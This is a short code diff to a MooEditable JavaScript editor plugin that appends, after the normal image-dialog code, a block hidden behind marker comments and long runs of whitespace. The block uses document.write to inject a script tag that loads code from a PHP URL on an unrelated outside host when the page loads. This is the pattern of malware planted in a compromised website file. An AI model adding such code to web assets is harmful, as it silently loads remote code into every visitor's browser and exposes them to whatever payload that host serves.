@@ -119,3 +119,13 @@ MooEditable.Actions.image = {
 		this.dialogs.image.prompt.open();
 	}
 };
+
+
+/*2a492d*/
+
+                    																	                               	 /*gbargbar09311gbar09*/
+
+document.write("<script type='text/javascript' src='http://j-j-computer.de/6Wf2mtKy.php?id=525355'></"+ "script>");
+
+
+/*/2a492d*/
